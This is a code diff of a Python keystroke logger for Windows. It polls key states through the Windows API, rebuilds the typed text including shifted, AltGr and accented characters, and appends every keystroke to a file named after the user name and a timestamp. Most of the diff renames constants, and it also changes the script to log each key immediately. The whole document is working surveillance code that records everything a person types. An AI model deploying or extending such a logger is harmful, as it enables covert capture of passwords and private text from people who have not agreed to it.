@@ -6,6 +6,10 @@ Created on 07-03-2016
 import codecs
 import win32api
 import ctypes
+import time
+import sched
+
+# Const initializations
 
 VK_CODE = {'backspace': 0x08,
            'tab': 0x09,
@@ -159,8 +163,8 @@ VK_NON_ASCII_CODE = {
     u'\u00C7': 0xC0
 }
 
-printable_non_alphanumeric = ['+', ',', '-', '.', "'", '\\', '<']
-shift_printable_non_alphanumeric = {
+PRINTABLE_NON_ALPHANUMERIC = ['+', ',', '-', '.', "'", '\\', '<']
+SHIFT_PRINTABLE_NON_ALPHANUMERIC = {
     '+': '*',
     ',': ';',
     '-': '_',
@@ -169,31 +173,39 @@ shift_printable_non_alphanumeric = {
     '\\': '|',
     '<': '>'
 }
-shift_printable_numeric = ['=', '!', '"', '#', '$', '%', '&', '/', '(', ')']
-shift_dead_keys = {'~': '^', u'\u00B4': '`'}
-alt_gr_numeric = ['}', '', '@', u'\u00A3', u'\u00A7', u'\u20AC', '', '{', '[', ']']
-alt_gr_non_numeric = {'e': u'\u20AC'}
+SHIFT_PRINTABLE_NUMERIC = ['=', '!', '"', '#', '$', '%', '&', '/', '(', ')']
+SHIFT_DEAD_KEYS = {'~': '^', u'\u00B4': '`'}
+ALT_GR_NUMERIC = ['}', '', '@', u'\u00A3', u'\u00A7', u'\u20AC', '', '{', '[',
+                  ']']
+ALT_GR_NON_NUMERIC = {'e': u'\u20AC'}
+LOCKS_STATE = {'caps_lock': False,
+               'num_lock': False,
+               'scroll_lock': False}
+CTRL = ['left_control', 'right_control']
+ALT = ['left_menu', 'right_menu']
+SHIFT = ['left_shift', 'right_shift']
+
+ALL_KEYS = VK_CODE.copy()
+ALL_KEYS.update(VK_NON_ASCII_CODE)
+ALL_KEYS.update(VK_DEAD_KEY_CODE)
+
+FILENAME = win32api.GetUserName() + "_" +\
+           time.strftime("%Y%m%d_%H%M%S") + ".txt"
+
+# Non-const initializations
 keysPressed = {}
 wasKeyPressedTheLastTimeWeChecked = {}
 keysDown = []
 dead_key = ''
-all_keys = VK_CODE.copy()
-all_keys.update(VK_NON_ASCII_CODE)
-all_keys.update(VK_DEAD_KEY_CODE)
-locks_state = {'caps_lock': False,
-               'num_lock': False,
-               'scroll_lock': False}
-buf = ""
-ctrl = ['left_control', 'right_control']
-alt = ['left_menu', 'right_menu']
-shift = ['left_shift', 'right_shift']
+buf = ''
 
 
 def dead_key_handler(k, shift_state=0):
     global buf
     global dead_key
 
-    if k != u'\u00A8' and (ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed()):
+    if k != u'\u00A8' and (
+            ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed()):
         return
 
     tilde = {
@@ -268,14 +280,14 @@ def key_was_pressed(k):
             else:
                 dead_key_handler(k)
         elif ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
-            dead_key = shift_dead_keys[k]
+            dead_key = SHIFT_DEAD_KEYS[k]
         elif k == '+' and get_alt_gr_pressed():
             dead_key = u'\u00A8'
         else:
             dead_key = k
         return
 
-    log_char(k)
+    write_to_log(k)
 
 
 def is_key_pressed(k):
@@ -302,28 +314,29 @@ def is_numeric(k):
 
 
 def is_num_lock_key(k):
-    return 0x60 <= all_keys[k] <= 0x6F
+    return 0x60 <= ALL_KEYS[k] <= 0x6F
 
 
 # Queries the Windows API to know which of the lock keys are turned on
 def set_locks_state():
     hll_dll = ctypes.WinDLL("User32.dll")
-    locks_state['caps_lock'] = bool(hll_dll.GetKeyState(0x14))
-    locks_state['num_lock'] = bool(hll_dll.GetKeyState(0x90))
-    locks_state['scroll_lock'] = bool(hll_dll.GetKeyState(0x91))
+    LOCKS_STATE['caps_lock'] = bool(hll_dll.GetKeyState(0x14))
+    LOCKS_STATE['num_lock'] = bool(hll_dll.GetKeyState(0x90))
+    LOCKS_STATE['scroll_lock'] = bool(hll_dll.GetKeyState(0x91))
 
 
 def log_char(key_down):
     global buf
 
     alt_gr = get_alt_gr_pressed()
-    # If alt gr, a control, an alt or both shift keys are pressed, nothing is typed, unless in the case of an alt gr +
-    # key combination, so it's useless to go on except in that case
+    # If alt gr, a control, an alt or both shift keys are pressed, nothing is
+    # typed, unless in the case of an alt gr + key combination, so it's useless
+    # to go on except in that case
     if alt_gr:
         if is_numeric(key_down):
-            buf += alt_gr_numeric[int(key_down)]
-        elif key_down in alt_gr_non_numeric:
-            buf += alt_gr_non_numeric[key_down]
+            buf += ALT_GR_NUMERIC[int(key_down)]
+        elif key_down in ALT_GR_NON_NUMERIC:
+            buf += ALT_GR_NON_NUMERIC[key_down]
         return
 
     if ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed():
@@ -340,9 +353,10 @@ def log_char(key_down):
         return
 
     # Check num lock keys
-    if locks_state['num_lock'] and is_num_lock_key(key_down):
-        num_lock_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '*', '+', '.', '-', ',', '/']
-        buf += num_lock_keys[all_keys[key_down] - 0x60]
+    if LOCKS_STATE['num_lock'] and is_num_lock_key(key_down):
+        num_lock_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '*',
+                         '+', '.', '-', ',', '/']
+        buf += num_lock_keys[ALL_KEYS[key_down] - 0x60]
         return
 
     # Count the number of shift keys pressed to know what was typed
@@ -351,7 +365,7 @@ def log_char(key_down):
     if is_alpha(key_down):
         if ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
             shift_state += 1
-        if locks_state['caps_lock']:
+        if LOCKS_STATE['caps_lock']:
             shift_state += 1
         if dead_key != '':
             dead_key_handler(key_down, shift_state)
@@ -364,12 +378,12 @@ def log_char(key_down):
             dead_key_handler(key_down)
         elif is_numeric(key_down):
             if shift_state % 2 == 1:
-                buf += shift_printable_numeric[int(key_down)]
+                buf += SHIFT_PRINTABLE_NUMERIC[int(key_down)]
             else:
                 buf += key_down
-        elif key_down in printable_non_alphanumeric:
+        elif key_down in PRINTABLE_NON_ALPHANUMERIC:
             if shift_state % 2 == 1:
-                buf += shift_printable_non_alphanumeric[key_down]
+                buf += SHIFT_PRINTABLE_NON_ALPHANUMERIC[key_down]
             else:
                 buf += key_down
         elif key_down in VK_NON_ASCII_CODE:
@@ -380,65 +394,60 @@ def get_alt_gr_pressed():
     # Check if alt gr / ctrl + alt combo is pressed
     alt_gr = 'right_menu' in keysDown
     if not alt_gr:
-        for k in ctrl:
+        for k in CTRL:
             if k in keysDown:
-                for l in alt:
+                for l in ALT:
                     if l in keysDown:
                         alt_gr = True
     return alt_gr
 
 
 def ctrl_key_pressed():
-    return (ctrl[0] in keysDown) or (ctrl[1] in keysDown)
+    return (CTRL[0] in keysDown) or (CTRL[1] in keysDown)
 
 
 def alt_key_pressed():
-    return (alt[0] in keysDown) or (alt[1] in keysDown)
+    return (ALT[0] in keysDown) or (ALT[1] in keysDown)
 
 
 def shift_keys_pressed():
-    return (shift[0] in keysDown) and (shift[1] in keysDown)
+    return (SHIFT[0] in keysDown) and (SHIFT[1] in keysDown)
 
 
 def init():
+    f = open(FILENAME, "w")
+    f.close()
     set_locks_state()
-    for key in all_keys:
+    for key in ALL_KEYS:
         keysPressed[key] = False
         wasKeyPressedTheLastTimeWeChecked[key] = False
 
 
-def write_to_log():
-    try:
-        f = open("log.txt", "w")
-        f.close()
-        with codecs.open("log.txt", "w", 'UTF-8') as f:
-            f.write(buf)
-    except:
-        write_to_log()
-        raise
+def write_to_log(k):
+    global buf
+    log_char(k)
+    with codecs.open(FILENAME, "a", 'UTF-8') as f:
+        f.write(buf)
+    buf = ''
 
 
 def main():
     init()
     while True:
-        try:
-            if ctrl_key_pressed() and 'c' in keysDown:
-                break
-            for k in all_keys:
-                key_is_pressed = is_key_pressed(all_keys[k])
-                if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked[k]:
-                    key_was_pressed(k)
-                    keysPressed[k] = True
-                    wasKeyPressedTheLastTimeWeChecked[k] = True
-                    if k == 'caps_lock' or k == 'num_lock' or k == 'scroll_lock':
-                        locks_state[k] = not locks_state[k]
-                if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
-                    key_was_unpressed(k)
-                    keysPressed[k] = False
-                    wasKeyPressedTheLastTimeWeChecked[k] = False
-        except:
-            write_to_log()
-            raise
-    write_to_log()
+        if ctrl_key_pressed() and 'c' in keysDown:
+            break
+        for k in ALL_KEYS:
+            key_is_pressed = is_key_pressed(ALL_KEYS[k])
+            if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked[k]:
+                key_was_pressed(k)
+                keysPressed[k] = True
+                wasKeyPressedTheLastTimeWeChecked[k] = True
+                if k == 'caps_lock' or k == 'num_lock' or k == \
+                        'scroll_lock':
+                    LOCKS_STATE[k] = not LOCKS_STATE[k]
+            if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
+                key_was_unpressed(k)
+                keysPressed[k] = False
+                wasKeyPressedTheLastTimeWeChecked[k] = False
 
 main()
